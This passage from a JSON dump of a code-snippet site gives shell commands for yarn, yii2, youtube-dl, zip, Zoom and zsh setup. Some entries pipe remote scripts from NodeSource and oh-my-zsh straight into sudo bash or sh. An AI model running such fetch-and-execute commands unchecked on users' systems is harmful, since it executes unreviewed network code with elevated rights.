    "description": "# First list devices (the phisical devices will appear on the top of the list) xcrun instruments -s devices # Using Device Name react-native run-ios --device \"Kool's iPhone\" # Using UDID react-native run-ios --udid 0412e2c2******51699\nSpecify a simulator using the --simulator flag.  These are the available devices for iOS 14.0 onwards:   npx react-native run-ios --simulator=\"iPhone 8\" npx react-native run-ios --simulator=\"iPhone 8 Plus\" npx react-native run-ios --simulator=\"iPhone 11\" npx react-native run-ios --simulator=\"iPhone 11 Pro\" npx react-native run-ios --simulator=\"iPhone 11 Pro Max\" npx react-native run-ios --simulator=\"iPhone SE (2nd generation)\" npx react-native run-ios --simulator=\"iPhone 12 mini\" npx react-native run-ios --simulator=\"iPhone 12\" npx react-native run-ios --simulator=\"iPhone 12 Pro\" npx react-native run-ios --simulator=\"iPhone 12 Pro Max\" npx react-native run-ios --simulator=\"iPod touch (7th generation)\" npx react-native run-ios --simulator=\"iPad Pro (9.7-inch)\" npx react-native run-ios --simulator=\"iPad Pro (11-inch) (2nd generation)\" npx react-native run-ios --simulator=\"iPad Pro (12.9-inch) (4th generation)\" npx react-native run-ios --simulator=\"iPad (8th generation)\" npx react-native run-ios --simulator=\"iPad Air (4th generation)\"\n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5092,
    "keyword": null,
    "link": null,
    "title": " yarn version",
    "description": "yarn --version\nThere are two ways where you can initiate a REACT app..  1. Using npm : npm init react-app <app_name> \t example : npm init react-app sampleApp 2. Using yarn : yarn create react-app <app_name> \t example : yarn create react-app sampleApp  \nchoco install yarn \nyarn policies set-version 1.13.0\nyarn policies set-version <version number> \n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5093,
    "keyword": null,
    "link": null,
    "title": " yarncommand install",
    "description": "npm install --global yarn \n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5094,
    "keyword": null,
    "link": null,
    "title": " yii2",
    "description": "composer create-project --prefer-dist yiisoft/yii2-app-basic basic \n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5095,
    "keyword": null,
    "link": null,
    "title": " yii2 gii command line to create model",
    "description": "$ ./yii gii/model --tableName=city --modelClass=City\n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5096,
    "keyword": null,
    "link": null,
    "title": " yii install",
    "description": "composer create-project --prefer-dist yiisoft/yii2-app-basic basic \ncomposer create-project --prefer-dist --stability=dev yiisoft/app <your project> \n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5097,
    "keyword": null,
    "link": null,
    "title": " youtube dl install ubuntu",
    "description": "$ sudo apt-get install youtube-dl\nsudo snap install youtube-dl\nsudo add-apt-repository ppa:nilarimogard/webupd8 sudo apt-get update && sudo apt-get install youtube-dlg\nsudo apt-get install youtube-dl --fix-missing\nsudo wget https://yt-dl.org/downloads/latest/youtube-dl -O /usr/local/bin/youtube-dl  sudo chmod a+rx /usr/local/bin/youtube-dl\n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5098,
    "keyword": null,
    "link": null,
    "title": " youtube music download ubuntu",
    "description": "Download youtube music app  sudo snap install youtube-music-desktop-app\nyoutube-dl can be installed easily:  sudo apt-get install youtube-dl ffmpeg Then simply:  youtube-dl -t --extract-audio --audio-format mp3 YOUTUBE_URL_HERE  (As shown here by duffydack.) https://askubuntu.com/questions/115587/how-can-i-download-music-from-youtube-and-not-the-video-film/115597#115597\n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5099,
    "keyword": null,
    "link": null,
    "title": " youtube to mp4 linux",
    "description": "sudo apt install youtube-dl youtube-dl [video url]\n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5100,
    "keyword": null,
    "link": null,
    "title": " youtubedl mp3",
    "description": "youtube-dl -x --audio-format mp3 <youtube-link>\nyoutube-dl --extract-audio --audio-format mp3 <video URL>\n# Use this to extract audio (you need to have installed ffmpeg) youtube-dl -x --audio-format mp3 https://www.youtube.com/watch?v=jwD4AEVBL6Q \n",
    "reg_date": "2021-10-11T22:13:40.000Z"
  },
  {
    "id": 5101,
    "keyword": null,
    "link": null,
    "title": " yum install node",
    "description": "curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash - sudo yum install nodejs\ncurl -sL https://rpm.nodesource.com/setup_12.x | sudo bash -\n",
    "reg_date": "2021-10-11T22:13:41.000Z"
  },
  {
    "id": 5102,
    "keyword": null,
    "link": null,
    "title": " yum list installed",
    "description": "yum list installed \n",
    "reg_date": "2021-10-11T22:13:41.000Z"
  },
  {
    "id": 5103,
    "keyword": null,
    "link": null,
    "title": " yusuke persona 5",
    "description": "Best boy\n",
    "reg_date": "2021-10-11T22:13:41.000Z"
  },
  {
    "id": 5104,
    "keyword": null,
    "link": null,
    "title": " zip a folder in colab",
    "description": "!zip -r /content/file.zip /content/Folder_To_Zip\n",
    "reg_date": "2021-10-11T22:13:41.000Z"
  },
  {
    "id": 5105,
    "keyword": null,
    "link": null,
    "title": " zip all files command linux",
    "description": "zip -r myfiles.zip mydir\n",
    "reg_date": "2021-10-11T22:13:41.000Z"
  },
  {
    "id": 5106,
    "keyword": null,
    "link": null,
    "title": " zip all files recursively linux",
    "description": "zip -r myfiles.zip mydir\n",
    "reg_date": "2021-10-11T22:13:41.000Z"
  },
  {
    "id": 5107,
    "keyword": null,
    "link": null,
    "title": " zip bash",
    "description": "zip -r filename.zip /path/to/folder1\nzip -r filename.zip folder zip -r filename.zip folder1 folder2 zip -r filename.zip /path/to/folder1 /path/to/file2\nzip -r myfiles.zip mydir\nZipping a folder in linux zip -r tecmint_files.zip tecmint_files  Unzipping a Zip file in linux unzip tecmint_files.zip\n$zip myfile.zip filename.txt\n",
    "reg_date": "2021-10-11T22:13:42.000Z"
  },
  {
    "id": 5108,
    "keyword": null,
    "link": null,
    "title": " zip command colab",
    "description": "!zip -r /content/file.zip /content/Folder_To_Zip\n",
    "reg_date": "2021-10-11T22:13:42.000Z"
  },
  {
    "id": 5109,
    "keyword": null,
    "link": null,
    "title": " zip folder terminal",
    "description": "zip -r mynewfilename.zip foldertozip/\n",
    "reg_date": "2021-10-11T22:13:43.000Z"
  },
  {
    "id": 5110,
    "keyword": null,
    "link": null,
    "title": " zip full folder ubuntu",
    "description": "zip -r example.zip original_folder \n",
    "reg_date": "2021-10-11T22:13:43.000Z"
  },
  {
    "id": 5111,
    "keyword": null,
    "link": null,
    "title": " zip not found",
    "description": "sudo apt-get install zip\n",
    "reg_date": "2021-10-11T22:13:43.000Z"
  },
  {
    "id": 5112,
    "keyword": null,
    "link": null,
    "title": " zipalign: command not found mac",
    "description": "find ~/Library/Android/sdk/build-tools -name \"zipalign\"\n",
    "reg_date": "2021-10-11T22:13:43.000Z"
  },
  {
    "id": 5113,
    "keyword": null,
    "link": null,
    "title": " zlib system dependencies macos",
    "description": "xcode-select --install \n",
    "reg_date": "2021-10-11T22:13:43.000Z"
  },
  {
    "id": 5114,
    "keyword": null,
    "link": null,
    "title": " zoom download linux",
    "description": "#For Ubuntu 14.04+ 64 Bit cd Downloads wget https://zoom.us/client/latest/zoom_amd64.deb sudo apt install ./zoom_amd64.deb #For Other Configs: #https://support.zoom.us/hc/en-us/articles/204206269-Installing-or-updating-Zoom-on-Linux\n# This just works, no prompts or unmentioned steps:  wget https://zoom.us/client/latest/zoom_amd64.deb -O /tmp/zoom.deb sudo apt install /tmp/zoom.deb -y\nsudo apt update sudo apt install snapd sudo snap install zoom-client\nwget https://zoom.us/client/latest/zoom_amd64.deb -O zoom.deb\n",
    "reg_date": "2021-10-11T22:13:43.000Z"
  },
  {
    "id": 5115,
    "keyword": null,
    "link": null,
    "title": " zoom download ubuntu",
    "description": "#For Ubuntu 14.04+ 64 Bit cd Downloads wget https://zoom.us/client/latest/zoom_amd64.deb sudo apt install ./zoom_amd64.deb #For Other Configs: #https://support.zoom.us/hc/en-us/articles/204206269-Installing-or-updating-Zoom-on-Linux\nsudo apt update sudo apt install snapd sudo snap install zoom-client\n#Installs zoom and all the required dependencies cd Downloads wget https://zoom.us/client/latest/zoom_amd64.deb sudo apt-get -f install ./zoom_amd64.deb\nsudo apt install ./zoom_amd64.deb\n",
    "reg_date": "2021-10-11T22:13:43.000Z"
  },
  {
    "id": 5116,
    "keyword": null,
    "link": null,
    "title": " zoom repository ubuntu",
    "description": "#For Ubuntu 14.04+ 64 Bit cd Downloads wget https://zoom.us/client/latest/zoom_amd64.deb sudo apt install ./zoom_amd64.deb #For Other Configs: #https://support.zoom.us/hc/en-us/articles/204206269-Installing-or-updating-Zoom-on-Linux\n",
    "reg_date": "2021-10-11T22:13:44.000Z"
  },
  {
    "id": 5117,
    "keyword": null,
    "link": null,
    "title": " zoom ubuntu 18.04",
    "description": "#For Ubuntu 14.04+ 64 Bit cd Downloads wget https://zoom.us/client/latest/zoom_amd64.deb sudo apt install ./zoom_amd64.deb #For Other Configs: #https://support.zoom.us/hc/en-us/articles/204206269-Installing-or-updating-Zoom-on-Linux\nsudo apt update sudo apt install snapd sudo snap install zoom-client\n",
    "reg_date": "2021-10-11T22:13:44.000Z"
  },
  {
    "id": 5118,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: flutter",
    "description": "#Set environment $PATH of flutter 1- Open the file $HOME/.zshrc  2- Add the following line in the opened file: export PATH=\"$PATH:/YOUR_FLUTTER_DIR/flutter/bin\" 3- Save changes and restart your terminal\nOpen Terminal nano ~/.zshrc Add: export PATH=[PATH_TO_FLUTTER_GIT_DIRECTORY]/flutter/bin:$PATH  Run: source ~/.zshrc restart terminal Run: flutter doctor -v\nPATH=/bin:/usr/bin:/usr/local/bin:${PATH} export PATH\n",
    "reg_date": "2021-10-11T22:13:44.000Z"
  },
  {
    "id": 5119,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: gatsby",
    "description": "On the latest MacOS, I had to update my npm config.  npm config delete prefix npm config set prefix /usr/local npm i -g gatsby-cli gatsby --version\n",
    "reg_date": "2021-10-11T22:13:44.000Z"
  },
  {
    "id": 5120,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: nvm",
    "description": "source ~/.nvm/nvm.sh \nbrew reinstall nvm\n# NVM Stuff export NVM_DIR=\"$HOME/.nvm\" . \"/usr/local/opt/nvm/nvm.sh\"\n# Check your .bash_profile, .zshrc, or .profile file. # You most likely had a problem during the installation. # You should have the following at the end of one of those files. [[ -s $HOME/.nvm/nvm.sh ]] && . $HOME/.nvm/nvm.sh  # This loads NVM\nCheck your .bash_profile, .zshrc, or .profile file. You most likely had a problem during the installation.  You should have the following at the end of one of those files.  [[ -s $HOME/.nvm/nvm.sh ]] && . $HOME/.nvm/nvm.sh  # This loads NVM \nexport NVM_DIR=\"$HOME/.nvm\" [ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"  # This loads nvm [ -s \"$NVM_DIR/bash_completion\" ] && \\. \"$NVM_DIR/bash_completion\"   # This loads nvm bash_completion \n",
    "reg_date": "2021-10-11T22:13:44.000Z"
  },
  {
    "id": 5121,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: pg restore docker",
    "description": "docker exec -it <name> pg_restore <input> > <output>.sql\n",
    "reg_date": "2021-10-11T22:13:44.000Z"
  },
  {
    "id": 5122,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: react-native",
    "description": "npm -g install react-native\n1.npm install -g react-native-cli\nzsh: command not found: react-native\n",
    "reg_date": "2021-10-11T22:13:45.000Z"
  },
  {
    "id": 5123,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: rvm on terminal load",
    "description": "# Run this command line: (if using login-shell) echo \"source $HOME/.rvm/scripts/rvm\" >> ~/.bash_profile  # Or this (if using non-login shell): echo \"source $HOME/.rvm/scripts/rvm\" >> ~/.bashrc  # Or if you are using zsh (and/or oh-my-zsh): echo \"source $HOME/.rvm/scripts/rvm\" >> ~/.zshrc\n",
    "reg_date": "2021-10-11T22:13:45.000Z"
  },
  {
    "id": 5124,
    "keyword": null,
    "link": null,
    "title": " zsh: no such file or directory: /usr/local/bin/composer.phar",
    "description": "sudo mv composer.phar /usr/local/bin/composer \n",
    "reg_date": "2021-10-11T22:13:45.000Z"
  },
  {
    "id": 5125,
    "keyword": null,
    "link": null,
    "title": " zsh autosuggestions",
    "description": "# Clone this repository into $ZSH_CUSTOM/plugins (by default ~/.oh-my-zsh/custom/plugins) git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions  # Add the plugin to the list of plugins for Oh My Zsh to load (inside ~/.zshrc): # plugins=(zsh-autosuggestions)\nGit Clone the zsh-autocomplete plugin in the OhMyZsh plugin folder. $ sudo git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions  Once that is done, add the plugin in the ~/.zshrc file's plugin list.  plugins=(   ...   zsh-autosuggestions )\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n",
    "reg_date": "2021-10-11T22:13:45.000Z"
  },
  {
    "id": 5126,
    "keyword": null,
    "link": null,
    "title": " zsh compinit: insecure directories, run compaudit for list.",
    "description": "$ sudo chmod -R 755 /usr/local/share/zsh $ sudo chown -R root:staff /usr/local/share/zsh \ncompaudit | xargs chmod g-w\nsudo chmod -R 755 /usr/local/share/zsh sudo chown -R root:staff /usr/local/share/zsh\n",
    "reg_date": "2021-10-11T22:13:45.000Z"
  },
  {
    "id": 5127,
    "keyword": null,
    "link": null,
    "title": " zsh create alias",
    "description": "# Locate your .zshrc file usually in root folder \"~/.zshrc\" # Add the desired alias alias aliasName=\"command\" # Reload .zshrc in orders for changes to take place source ~/.zshrc\n# Create custom file aliases.zsh the directory .oh-my-zsh/custom/ touch $ZSH/custom/aliases.zsh # Edit the file you just created vim $ZSH/custom/aliases.zsh # Add your formatted aliases e.g: alias g=\"git\" # Source the .zshrc or start a new terminal session to apply changes source ~/.zshrc \n",
    "reg_date": "2021-10-11T22:13:45.000Z"
  },
  {
    "id": 5128,
    "keyword": null,
    "link": null,
    "title": " zsh default editor",
    "description": "# Examples are for vim, but you can change the path  # to whatever you want # e.g: /usr/bin/code for visual studio code  # In bash: echo \"export EDITOR=/usr/bin/vim\" >> ~/.bashrc echo \"export VISUAL=/usr/bin/vim\" >> ~/.bashrc  # In zsh: echo \"export EDITOR=/usr/bin/vim\" >> ~/.zshrc echo \"export VISUAL=/usr/bin/vim\" >> ~/.zshrc  # In ksh: echo \"export EDITOR=/usr/bin/vim\" >> ~/.kshrc echo \"export VISUAL=/usr/bin/vim\" >> ~/.kshrc\n",
    "reg_date": "2021-10-11T22:13:46.000Z"
  },
  {
    "id": 5129,
    "keyword": null,
    "link": null,
    "title": " zsh mac",
    "description": "$ brew install zsh \nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n",
    "reg_date": "2021-10-11T22:13:46.000Z"
  },
  {
    "id": 5130,
    "keyword": null,
    "link": null,
    "title": " zsh stat timefmt Ymd HMS",
    "description": "stat -t \"%Y%m%d%H%M%S\" # an example of call , \"%Y\" also \"%0Y\", but not \"%.Y\"  Y   Year m\tMonth d\tDate H \tHour (0-23) h \tHour (1-12) M \tMinute (0-59) S \tSeconds (0-59) s \tMilliseconds (0-999) p \ttext \"pm\" or \"am\" P \ttext \"PM\" or \"AM\" % \tThe symbol \"%\"  # macOS 10.15.6 ## source: # https://www.maths.ed.ac.uk/hall/Xpress/FICO_Docs/mosel/mosel_lang/dhtml/timefmt.html # https://unix.stackexchange.com/questions/238639/test-if-file-was-modified-after-date-in-file-name \n",
    "reg_date": "2021-10-11T22:13:46.000Z"
  },
  {
    "id": 5131,
    "keyword": null,
    "link": null,
    "title": " zsh syntax highlighting plugin",
    "description": "",
    "reg_date": "2021-10-11T22:13:46.000Z"
  }
]